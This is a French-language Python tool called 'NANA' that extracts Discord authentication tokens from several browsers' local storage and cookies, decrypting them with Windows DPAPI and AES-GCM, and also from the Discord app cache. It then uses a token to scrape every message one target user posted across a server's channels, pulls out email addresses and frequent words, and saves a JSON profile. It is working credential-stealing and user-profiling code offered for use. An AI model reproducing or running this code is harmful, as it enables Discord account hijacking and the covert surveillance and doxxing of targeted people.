# -*- coding: utf-8 -*-
# NANA
# Usage: python nana.py

import os
import sys
import json
import time
import re
import traceback
import shutil
import base64
import glob
import sqlite3
import random
from datetime import datetime
from collections import defaultdict

# ========== ANIMATION STARTUP (HEART RAIN + CAT) ==========
WIDTH = 80
HEIGHT = 24

CAT = [
    r".               ,.",
    r"          T.\"-._..---.._,-\"/|",
    r"          l|\"-.  _.v._   (\" |",
    r"          [l /.'_ \; _~\"-.`-t",
    r"          Y \" _(o} _{o)._ ^.|",
    r"          j  T  ,-<v>-.  T  ]",
    r"          \  l ( /-^-\ ) !  !",
    r"           \. \.  \"~\"  ./  /c-..,__",
    r"             ^r- .._ .- .-\"  `- .  ~\"--.",
    r"              > \.                      \\",
    r"              ]   ^.                     \\",
    r"              3  .  \">            .       Y",
    r" ,.__.--._   _j   \ ~   .         ;       |",
    r"(    ~\"-._~\"^._\   ^.    ^._      I     . l",
    r" \"-._ ___ ~\"-,_7    .Z-._   7\"   Y      ;  \        _",
    r"    /\"   \"~-(r r  _/_--._~-/    /      /,.--^-._   / Y",
    r"    \"-._    '\"~~~>-._~]>--^---./____,.^~        ^.^  !",
    r"        ~--._    '   Y---.                        \./",
    r"             ~~--._  l_   )                        \\",
    r"                   ~-._~~~---._,____..---           \\",
    r"                       ~----\"~       \\",
    r"                                      \\",
]

def clear_anim():
    os.system("cls" if os.name == "nt" else "clear")

def heart_rain(duration=2.5):
    clear_anim()
    columns = [
        {
            "x": random.randint(0, WIDTH - 1),
            "y": random.randint(-HEIGHT, 0),
            "speed": random.choice([1, 1, 1, 2]),
        }
        for _ in range(35)
    ]
    start = time.time()
    while time.time() - start < duration:
        clear_anim()
        for heart in columns:
            heart["y"] += heart["speed"]
            if heart["y"] > HEIGHT:
                heart["y"] = random.randint(-10, -1)
                heart["x"] = random.randint(0, WIDTH - 1)
            if 0 <= heart["y"] < HEIGHT:
                print(f"\033[{heart['y'] + 1};{heart['x'] + 1}m♥", end="")
        sys.stdout.flush()
        time.sleep(0.08)
    print("\033[0m")

def show_cat():
    clear_anim()
    top = max(0, (HEIGHT - len(CAT)) // 2)
    left = max(0, (WIDTH - max(len(line) for line in CAT)) // 2)
    for i, line in enumerate(CAT):
        sys.stdout.write(f"\033[{top + i + 1};{left + 1}H")
        for char in line:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.008)
    sys.stdout.write("\033[0m")
    sys.stdout.flush()
    time.sleep(2)

def startup():
    heart_rain()
    show_cat()
    clear_anim()

# ========== COULEURS ==========
class Colors:
    RED = '\033[91m'
    DARKRED = '\033[31m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'

def log(msg, color=Colors.WHITE, bold=False):
    b = Colors.BOLD if bold else ""
    print(f"{color}{b}{msg}{Colors.RESET}")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def title(text):
    if os.name == 'nt':
        os.system(f'title {text}')
    else:
        sys.stdout.write(f'\033]2;{text}\007')

def get_username():
    try:
        import getpass
        return getpass.getuser()
    except:
        return "user"

def get_os_name():
    return "Windows" if os.name == 'nt' else "Linux"

# ========== CHECK DEPENDANCES ==========
def crash_handler(exc_type, exc_value, exc_traceback):
    print("\n" + "="*70)
    print("ERREUR FATALE")
    print("="*70)
    traceback.print_exception(exc_type, exc_value, exc_traceback)
    print("="*70)
    input("\nAppuie sur Entree pour fermer...")
    sys.exit(1)

sys.excepthook = crash_handler

def check_dependencies():
    missing = []
    try:
        import requests
    except ImportError:
        missing.append("requests")
    try:
        from Crypto.Cipher import AES
    except ImportError:
        missing.append("pycryptodome")
    try:
        import win32crypt
    except ImportError:
        missing.append("pypiwin32")
    if missing:
        print("\n" + "="*70)
        print("DEPENDANCES MANQUANTES")
        print("="*70)
        for dep in missing:
            print(f"  - {dep}")
        print("\nInstalle-les avec la commande:")
        print(f"  pip install {' '.join(missing)}")
        print("="*70)
        input("\nAppuie sur Entree pour fermer...")
        sys.exit(1)

check_dependencies()

import requests
from Crypto.Cipher import AES
import win32crypt

# ========== ANIMATION BANNER ==========
def animate_banner():
    clear()
    banner = """
                             ███▄    █  ▄▄▄       ███▄    █  ▄▄▄      
                             ██ ▀█   █ ▒████▄     ██ ▀█   █ ▒████▄    
                            ▓██  ▀█ ██▒▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄  
                            ▓██▒  ▐▌██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██ 
                            ▒██░   ▓██░ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒
                            ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░
                            ░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░
                               ░   ░ ░   ░   ▒      ░   ░ ░   ░   ▒   
                                     ░       ░  ░         ░       ░  ░
    """
    log(banner, Colors.RED, True)
    time.sleep(0.3)
    log("                                        NANA", Colors.RED, True)
    time.sleep(0.3)
    log("                                -----------------------------", Colors.RED)
    time.sleep(0.3)
    log("                                [ Extraction | Analyse | OSINT ]", Colors.DIM)
    time.sleep(0.3)
    log("                                    Dev par silentShell !", Colors.RED, True)
    time.sleep(0.5)

# ========== CONFIG ==========
class Config:
    TOKEN = None
    SERVER_ID = None
    USER_ID = None
    USERNAME = None
    BASE_URL = "https://discord.com/api/v9"
    HEADERS = {}
    MESSAGES = []
    CHAT_CHANNELS = []
    SELECTED_CHANNELS = []
    USER_INFO = {}
    TOKEN_SOURCE = None

# ========== EXTRACTION DU TOKEN ==========
def get_chrome_key():
    try:
        local_state_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State"
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(encrypted_value, key):
    try:
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
    except:
        return None

def validate_token(token):
    try:
        headers = {
            "Authorization": token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        return response.status_code == 200
    except:
        return False

def extract_discord_token_from_browser():
    log("\n[*] Recherche du token Discord dans les navigateurs...", Colors.RED)
    browsers = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data"
    }
    discord_patterns = [
        r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}',
        r'mfa\.[\w-]{80,95}',
        r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}'
    ]
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue
        log(f"    [*] Verification de {browser_name}...", Colors.DIM)
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for profile in profiles:
            local_storage_path = os.path.join(browser_path, profile, "Local Storage", "leveldb")
            if not os.path.exists(local_storage_path):
                continue
            for file_pattern in ["*.log", "*.ldb"]:
                for file_path in glob.glob(os.path.join(local_storage_path, file_pattern)):
                    try:
                        with open(file_path, "rb") as f:
                            content = f.read().decode('utf-8', errors='ignore')
                            for pattern in discord_patterns:
                                matches = re.findall(pattern, content)
                                for token in matches:
                                    if validate_token(token):
                                        log(f"    [+] Token trouve dans {browser_name} ({profile})", Colors.GREEN)
                                        Config.TOKEN_SOURCE = f"{browser_name} - {profile}"
                                        return token
                    except:
                        pass
        cookies_path = os.path.join(browser_path, "Default", "Cookies")
        if os.path.exists(cookies_path):
            try:
                temp_cookies = os.path.join(os.environ.get("TEMP", "."), "temp_cookies.db")
                shutil.copyfile(cookies_path, temp_cookies)
                conn = sqlite3.connect(temp_cookies)
                cursor = conn.cursor()
                cursor.execute("SELECT name, encrypted_value FROM cookies WHERE name LIKE '%token%' OR host_key LIKE '%discord%'")
                rows = cursor.fetchall()
                conn.close()
                os.remove(temp_cookies)
                chrome_key = get_chrome_key()
                if chrome_key:
                    for name, encrypted_value in rows:
                        if encrypted_value:
                            decrypted = decrypt_value(encrypted_value, chrome_key)
                            if decrypted:
                                for pattern in discord_patterns:
                                    matches = re.findall(pattern, decrypted)
                                    for token in matches:
                                        if validate_token(token):
                                            log(f"    [+] Token trouve dans les cookies de {browser_name}", Colors.GREEN)
                                            Config.TOKEN_SOURCE = f"{browser_name} - Cookies"
                                            return token
            except:
                pass
    discord_cache_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\discord\Local Storage\leveldb"
        os.path.expanduser("~") + r"\AppData\Roaming\discord\Cache",
        os.path.expanduser("~") + r"\AppData\Roaming\discord\Code Cache"
    ]
    for cache_path in discord_cache_paths:
        if os.path.exists(cache_path):
            log(f"    [*] Verification de Discord App...", Colors.DIM)
            for file_pattern in ["*.log", "*.ldb", "*.bin", "*"]:
                for file_path in glob.glob(os.path.join(cache_path, file_pattern)):
                    try:
                        with open(file_path, "rb") as f:
                            content = f.read().decode('utf-8', errors='ignore')
                            for pattern in discord_patterns:
                                matches = re.findall(pattern, content)
                                for token in matches:
                                    if validate_token(token):
                                        log(f"    [+] Token trouve dans Discord App", Colors.GREEN)
                                        Config.TOKEN_SOURCE = "Discord App"
                                        return token
                    except:
                        pass
    log("    [-] Aucun token Discord trouve dans les navigateurs", Colors.RED)
    return None

# ========== API FUNCTIONS ==========
def set_token(token):
    Config.TOKEN = token
    Config.HEADERS = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    log(f"[+] Token defini (source: {Config.TOKEN_SOURCE})", Colors.RED)

def test_token():
    try:
        response = requests.get(f"{Config.BASE_URL}/users/@me", headers=Config.HEADERS, timeout=10)
        if response.status_code == 200:
            data = response.json()
            log(f"[+] Connecte en tant que: {data['username']}#{data.get('discriminator', '0000')}", Colors.RED)
            Config.USER_INFO = data
            return True
        else:
            log("[-] Token invalide", Colors.RED)
            return False
    except Exception as e:
        log(f"[-] Erreur: {str(e)}", Colors.RED)
        return False

def get_guild_channels(guild_id):
    try:
        response = requests.get(f"{Config.BASE_URL}/guilds/{guild_id}/channels", headers=Config.HEADERS, timeout=15)
        if response.status_code == 200:
            channels = response.json()
            text_channels = []
            chat_types = [0, 5, 10, 11, 15, 16]
            for channel in channels:
                if channel.get("type") in chat_types:
                    text_channels.append({
                        "id": channel["id"],
                        "name": channel["name"],
                        "nsfw": channel.get("nsfw", False)
                    })
            Config.CHAT_CHANNELS = text_channels
            return text_channels
        return []
    except Exception as e:
        log(f"[-] Erreur: {str(e)}", Colors.RED)
        return []

def get_user_info(user_id):
    try:
        response = requests.get(f"{Config.BASE_URL}/users/{user_id}", headers=Config.HEADERS, timeout=10)
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

def get_channel_messages(channel_id, limit=100, before=None):
    try:
        params = {"limit": min(limit, 100)}
        if before:
            params["before"] = before
        response = requests.get(f"{Config.BASE_URL}/channels/{channel_id}/messages", headers=Config.HEADERS, params=params, timeout=15)
        if response.status_code == 200:
            return response.json()
        elif response.status_code == 429:
            data = response.json()
            retry_after = data.get("retry_after", 5)
            log(f"    [*] Rate limit - pause {retry_after:.1f}s", Colors.YELLOW)
            time.sleep(retry_after + 1)
            return get_channel_messages(channel_id, limit, before)
        return []
    except:
        return []

def find_user_in_guild(guild_id, username=None, user_id=None):
    log("\n[*] Recherche de l'utilisateur...", Colors.RED)
    if user_id:
        user_info = get_user_info(user_id)
        if user_info:
            Config.USER_ID = user_id
            Config.USER_INFO = user_info
            Config.USERNAME = user_info.get("username", "unknown")
            log(f"[+] Utilisateur trouve: {Config.USERNAME}#{user_info.get('discriminator', '0000')}", Colors.RED)
            return True
        else:
            log("[-] Utilisateur introuvable", Colors.RED)
            return False
    if username:
        channels = get_guild_channels(guild_id)
        if not channels:
            log("[-] Impossible de recuperer les salons", Colors.RED)
            return False
        for channel in channels[:10]:
            messages = get_channel_messages(channel["id"], 50)
            for msg in messages:
                author = msg.get("author", {})
                if username.lower() in author.get("username", "").lower():
                    user = author
                    Config.USER_ID = user["id"]
                    Config.USER_INFO = user
                    Config.USERNAME = user["username"]
                    log(f"[+] Utilisateur trouve: {Config.USERNAME}#{user.get('discriminator', '0000')}", Colors.RED)
                    return True
            time.sleep(0.3)
        log("[-] Utilisateur non trouve", Colors.RED)
        return False
    log("[-] Aucun identifiant fourni", Colors.RED)
    return False

def get_user_messages_in_channel(channel_id, user_id, channel_name, max_messages=5000):
    messages = []
    before = None
    total_fetched = 0
    while total_fetched < max_messages:
        fetched = get_channel_messages(channel_id, 100, before)
        if not fetched:
            break
        for msg in fetched:
            if msg["author"]["id"] == user_id:
                author = msg["author"]
                display_name = author.get("global_name") or author.get("username", "Inconnu")
                messages.append({
                    "content": msg["content"],
                    "timestamp": msg["timestamp"],
                    "id": msg["id"],
                    "channel": channel_name,
                    "channel_id": channel_id,
                    "author": author,
                    "author_name": display_name,
                    "author_username": author.get("username", "inconnu"),
                    "attachments": msg.get("attachments", []),
                    "embeds": msg.get("embeds", []),
                    "mentions": [m["id"] for m in msg.get("mentions", [])],
                    "pinned": msg.get("pinned", False),
                    "reactions": [r["emoji"]["name"] for r in msg.get("reactions", [])]
                })
        total_fetched += len(fetched)
        before = fetched[-1]["id"]
        if len(fetched) < 100:
            break
        time.sleep(0.3)
    return messages

def select_channels():
    log(f"\n[*] {len(Config.CHAT_CHANNELS)} salons chat disponibles:", Colors.RED)
    log("="*50, Colors.RED)
    for i, channel in enumerate(Config.CHAT_CHANNELS):
        icon = "[NSFW]" if channel.get("nsfw") else "[TEXT]"
        log(f"  [{i+1:2}] {icon} #{channel['name']}", Colors.RED)
    log("", Colors.WHITE)
    log("[?] Choisis les salons a scanner:", Colors.RED)
    log("  [all]  - Scanner TOUS les salons", Colors.RED)
    log("  [num]  - Scanner un salon (ex: 3)", Colors.RED)
    log("  [1,2,3] - Scanner plusieurs salons", Colors.RED)
    log("  [1-5]  - Scanner une plage", Colors.RED)
    choice = input("[?] Ton choix: ").strip()
    if choice.lower() == "all":
        Config.SELECTED_CHANNELS = Config.CHAT_CHANNELS
        log(f"[+] Tous les {len(Config.SELECTED_CHANNELS)} salons selectionnes", Colors.RED)
        return True
    if "-" in choice:
        try:
            parts = choice.split("-")
            start = int(parts[0].strip()) - 1
            end = int(parts[1].strip())
            Config.SELECTED_CHANNELS = Config.CHAT_CHANNELS[start:end]
            log(f"[+] {len(Config.SELECTED_CHANNELS)} salons selectionnes", Colors.RED)
            return True
        except:
            log("[-] Format invalide", Colors.RED)
            return False
    if "," in choice:
        try:
            indices = [int(x.strip()) - 1 for x in choice.split(",")]
            Config.SELECTED_CHANNELS = [Config.CHAT_CHANNELS[i] for i in indices if 0 <= i < len(Config.CHAT_CHANNELS)]
            log(f"[+] {len(Config.SELECTED_CHANNELS)} salons selectionnes", Colors.RED)
            return True
        except:
            log("[-] Format invalide", Colors.RED)
            return False
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(Config.CHAT_CHANNELS):
            Config.SELECTED_CHANNELS = [Config.CHAT_CHANNELS[idx]]
            log(f"[+] Salon #{Config.CHAT_CHANNELS[idx]['name']} selectionne", Colors.RED)
            return True
        else:
            log("[-] Numero invalide", Colors.RED)
            return False
    except:
        log("[-] Choix invalide", Colors.RED)
        return False

def run_scan():
    if not Config.SELECTED_CHANNELS:
        log("[-] Aucun salon selectionne", Colors.RED)
        return []
    log(f"\n[*] Debut du scan...", Colors.RED)
    log(f"[*] Cible: {Config.USERNAME}#{Config.USER_INFO.get('discriminator', '0000')}", Colors.RED)
    all_messages = []
    total = 0
    for i, channel in enumerate(Config.SELECTED_CHANNELS):
        log(f"\n[*] Salon {i+1}/{len(Config.SELECTED_CHANNELS)}: #{channel['name']}", Colors.RED)
        messages = get_user_messages_in_channel(channel["id"], Config.USER_ID, channel["name"], 5000)
        all_messages.extend(messages)
        total += len(messages)
        if messages:
            log(f"    [+] {len(messages)} messages trouves", Colors.GREEN)
        else:
            log(f"    [*] Aucun message trouve", Colors.YELLOW)
        time.sleep(0.5)
    Config.MESSAGES = all_messages
    log(f"\n[+] Scan termine - {total} messages trouves", Colors.GREEN)
    return all_messages

def display_all_messages(messages):
    if not messages:
        log("[-] Aucun message a afficher", Colors.RED)
        return
    log("\n" + "="*70, Colors.RED)
    log("TOUS LES MESSAGES".center(70), Colors.RED, True)
    log("="*70, Colors.RED)
    sorted_msgs = sorted(messages, key=lambda x: x["timestamp"], reverse=True)
    for i, msg in enumerate(sorted_msgs):
        try:
            dt = datetime.fromisoformat(msg["timestamp"].replace('Z', '+00:00'))
            heure = f"{dt.hour:02d}h{dt.minute:02d}"
        except:
            heure = "??h??"
        channel = msg.get("channel", "inconnu")
        content = msg['content'].strip()
        if not content:
            content = "[Piece jointe]"
        try:
            log(f"Message : {content} | ({heure}) #{channel}", Colors.RED)
        except:
            content_clean = re.sub(r'<:[^:]+:\d+>', '[emoji]', content)
            log(f"Message : {content_clean} | ({heure}) #{channel}", Colors.RED)
    log("\n" + "="*70, Colors.RED)
    log(f"Total: {len(sorted_msgs)} messages affiches".center(70), Colors.DIM)
    log("="*70, Colors.RED)

def display_messages_by_channel(messages):
    if not messages:
        log("[-] Aucun message a afficher", Colors.RED)
        return
    by_channel = defaultdict(list)
    for msg in messages:
        by_channel[msg['channel']].append(msg)
    log("\n" + "="*70, Colors.RED)
    log("MESSAGES PAR SALON".center(70), Colors.RED, True)
    log("="*70, Colors.RED)
    for channel, msgs in sorted(by_channel.items(), key=lambda x: len(x[1]), reverse=True):
        log(f"\n#{channel} ({len(msgs)} messages)", Colors.RED, True)
        log("-"*70, Colors.RED)
        sorted_msgs = sorted(msgs, key=lambda x: x["timestamp"], reverse=True)
        for msg in sorted_msgs:
            try:
                dt = datetime.fromisoformat(msg["timestamp"].replace('Z', '+00:00'))
                heure = f"{dt.hour:02d}h{dt.minute:02d}"
            except:
                heure = "??h??"
            content = msg['content'].strip()
            if not content:
                content = "[Piece jointe]"
            try:
                log(f"Message : {content} | ({heure}) #{channel}", Colors.RED)
            except:
                content_clean = re.sub(r'<:[^:]+:\d+>', '[emoji]', content)
                log(f"Message : {content_clean} | ({heure}) #{channel}", Colors.RED)
    log("\n" + "="*70, Colors.RED)

def analyze_messages(messages):
    analysis = {
        "total": len(messages),
        "channels": defaultdict(int),
        "emails": [],
        "words": defaultdict(int),
        "first_message": None,
        "last_message": None,
        "attachments": 0,
        "pinned": 0
    }
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    for msg in messages:
        content = msg["content"]
        channel = msg["channel"]
        analysis["channels"][channel] += 1
        if not analysis["first_message"]:
            analysis["first_message"] = msg
        analysis["last_message"] = msg
        if msg.get("pinned"):
            analysis["pinned"] += 1
        if msg.get("attachments"):
            analysis["attachments"] += len(msg["attachments"])
        words = re.findall(r'\b[a-zA-ZÀ-ÿ]{4,}\b', content.lower())
        for word in words:
            analysis["words"][word] += 1
        emails = re.findall(email_pattern, content)
        if emails:
            analysis["emails"].extend(emails)
    return analysis

def display_analysis(analysis):
    log("\n" + "="*60, Colors.RED)
    log("ANALYSE".center(60), Colors.RED, True)
    log("="*60, Colors.RED)
    log(f"\nSTATISTIQUES:", Colors.RED, True)
    log(f"  - Messages: {analysis['total']}", Colors.RED)
    log(f"  - Salons: {len(analysis['channels'])}", Colors.RED)
    if analysis['attachments'] > 0:
        log(f"  - Fichiers joints: {analysis['attachments']}", Colors.RED)
    if analysis['pinned'] > 0:
        log(f"  - Messages epingles: {analysis['pinned']}", Colors.RED)
    if analysis['first_message']:
        log(f"\nACTIVITE:", Colors.RED, True)
        log(f"  - Premier: {analysis['first_message']['timestamp']}", Colors.RED)
        log(f"  - Dernier: {analysis['last_message']['timestamp']}", Colors.RED)
    if analysis['channels']:
        log(f"\nSALONS:", Colors.RED, True)
        sorted_channels = sorted(analysis['channels'].items(), key=lambda x: x[1], reverse=True)
        for channel, count in sorted_channels[:10]:
            bar = "#" * min(20, int(count / max(1, analysis['total']) * 20))
            log(f"  - #{channel}: {count} messages {bar}", Colors.RED)
    if analysis['words']:
        log(f"\nMOTS CLES:", Colors.RED, True)
        sorted_words = sorted(analysis['words'].items(), key=lambda x: x[1], reverse=True)[:15]
        for word, count in sorted_words:
            bar = "#" * min(20, int(count / max(1, sorted_words[0][1]) * 20))
            log(f"  - {word}: {count} {bar}", Colors.RED)
    if analysis['emails']:
        log(f"\nEMAILS TROUVES:", Colors.RED, True)
        for email in set(analysis['emails']):
            log(f"  - {email}", Colors.RED)
    log("\n" + "="*60, Colors.RED)

def save_results(messages, analysis, username):
    filename = f"nana_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = {
        "user": Config.USER_INFO,
        "server_id": Config.SERVER_ID,
        "channels_scanned": [{"id": c["id"], "name": c["name"]} for c in Config.SELECTED_CHANNELS],
        "analysis": {
            "total_messages": analysis["total"],
            "channels": dict(analysis["channels"]),
            "first_message": analysis["first_message"],
            "last_message": analysis["last_message"],
            "emails": list(set(analysis["emails"])),
            "top_words": dict(sorted(analysis["words"].items(), key=lambda x: x[1], reverse=True)[:50])
        },
        "messages": messages
    }
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False, default=str)
    log(f"\n[+] Sauvegarde: {filename}", Colors.RED)

def shell_prompt():
    os_name = get_os_name()
    return f" {Colors.RED}┌──({Colors.WHITE}silentShell@nana{Colors.RED})─[{Colors.WHITE}~/{os_name}{Colors.RED}]\n {Colors.RED}└─{Colors.WHITE}$ {Colors.RESET}"

def show_menu():
    menu = f"""
 {Colors.RED}┌────────────────────────────────────────────────────────────────┐
 {Colors.RED}│  NANA - Discord Tool                                           │
 {Colors.RED}│  Developpe par silentShell                                     │
 {Colors.RED}├────────────────────────────────────────────────────────────────┤
 {Colors.RED}│  [1] Extraction auto du token (navigateur/Discord)             │
 {Colors.RED}│  [2] Saisie manuelle du token                                  │
 {Colors.RED}│  [3] Quitter                                                   │
 {Colors.RED}└────────────────────────────────────────────────────────────────┘
"""
    print(menu)
    return input(shell_prompt())

def show_scan_menu():
    menu = f"""
 {Colors.RED}┌────────────────────────────────────────────────────────────────┐
 {Colors.RED}│  [1] Afficher TOUS les messages                                │
 {Colors.RED}│  [2] Afficher les messages par salon                           │
 {Colors.RED}│  [3] Ne pas afficher                                           │
 {Colors.RED}└────────────────────────────────────────────────────────────────┘
"""
    print(menu)
    return input(shell_prompt())

def show_user_menu():
    menu = f"""
 {Colors.RED}┌────────────────────────────────────────────────────────────────┐
 {Colors.RED}│  [1] Par ID                                                    │
 {Colors.RED}│  [2] Par username                                              │
 {Colors.RED}└────────────────────────────────────────────────────────────────┘
"""
    print(menu)
    return input(shell_prompt())

def main():
    startup()
    animate_banner()

    username = get_username()
    title(f"NANA - {username}")

    log("\n[+] NANA", Colors.RED, True)
    log("[+] Extraction + Analyse Discord", Colors.RED)
    log("[+] Developpe par silentShell", Colors.RED, True)
    time.sleep(1)

    choice = show_menu()

    if choice == "1":
        log("\n[*] Extraction automatique du token...", Colors.RED)
        token = extract_discord_token_from_browser()
        if token:
            log(f"\n[+] Token extrait avec succes !", Colors.GREEN)
            log(f"[+] Source: {Config.TOKEN_SOURCE}", Colors.GREEN)
            set_token(token)
        else:
            log("\n[-] Impossible d'extraire le token automatiquement", Colors.RED)
            log("[?] Saisie manuelle :", Colors.RED)
            token = input(shell_prompt() + "[?] Token Discord: ").strip()
            while not token:
                log("[-] Token requis", Colors.RED)
                token = input(shell_prompt() + "[?] Token Discord: ").strip()
            Config.TOKEN_SOURCE = "Manuel"
            set_token(token)
    elif choice == "2":
        token = input(shell_prompt() + "[?] Token Discord: ").strip()
        while not token:
            log("[-] Token requis", Colors.RED)
            token = input(shell_prompt() + "[?] Token Discord: ").strip()
        Config.TOKEN_SOURCE = "Manuel"
        set_token(token)
    elif choice == "3":
        log("\n[+] Au revoir !", Colors.RED)
        input("\nAppuie sur Entree pour fermer...")
        sys.exit(0)
    else:
        log("\n[-] Choix invalide", Colors.RED)
        input("\nAppuie sur Entree pour fermer...")
        sys.exit(1)

    if not test_token():
        input("\n[?] Appuie sur Entree pour quitter...")
        return

    server_id = input(shell_prompt() + "[?] ID du serveur: ").strip()
    while not server_id:
        log("[-] ID du serveur requis", Colors.RED)
        server_id = input(shell_prompt() + "[?] ID du serveur: ").strip()
    Config.SERVER_ID = server_id

    channels = get_guild_channels(server_id)
    if not channels:
        log("[-] Aucun salon chat trouve", Colors.RED)
        input("\n[?] Appuie sur Entree pour quitter...")
        return
    log(f"[+] {len(channels)} salons chat trouves", Colors.GREEN)

    if not select_channels():
        input("\n[?] Appuie sur Entree pour quitter...")
        return

    log("\n[?] Recherche de l'utilisateur:", Colors.RED)
    choice = show_user_menu()

    if choice == "1":
        user_id = input(shell_prompt() + "[?] ID: ").strip()
        while not user_id:
            log("[-] ID requis", Colors.RED)
            user_id = input(shell_prompt() + "[?] ID: ").strip()
        if not find_user_in_guild(server_id, user_id=user_id):
            log("[-] Utilisateur non trouve", Colors.RED)
            input("\n[?] Appuie sur Entree pour quitter...")
            return
    elif choice == "2":
        username_input = input(shell_prompt() + "[?] Username: ").strip()
        while not username_input:
            log("[-] Username requis", Colors.RED)
            username_input = input(shell_prompt() + "[?] Username: ").strip()
        if not find_user_in_guild(server_id, username=username_input):
            log("[-] Utilisateur non trouve", Colors.RED)
            input("\n[?] Appuie sur Entree pour quitter...")
            return
    else:
        log("[-] Choix invalide", Colors.RED)
        input("\n[?] Appuie sur Entree pour quitter...")
        return

    messages = run_scan()
    if not messages:
        log("\n[-] Aucun message trouve", Colors.RED)
        input("\n[?] Appuie sur Entree pour quitter...")
        return

    analysis = analyze_messages(messages)
    display_analysis(analysis)

    log("\n[?] Affichage des messages:", Colors.RED)
    msg_choice = show_scan_menu()

    if msg_choice == "1":
        display_all_messages(messages)
    elif msg_choice == "2":
        display_messages_by_channel(messages)

    save_choice = input(shell_prompt() + "[?] Sauvegarder les resultats ? (o/n): ").strip().lower()
    if save_choice in ["o", "y"]:
        save_results(messages, analysis, Config.USERNAME)

    log("\n[+] NANA termine", Colors.GREEN)
    input("\n[?] Appuie sur Entree pour quitter...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Arret demande")
        input("Appuie sur Entree pour fermer...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Erreur: {e}")
        traceback.print_exc()
        input("\nAppuie sur Entree pour fermer...")
        sys.exit(1)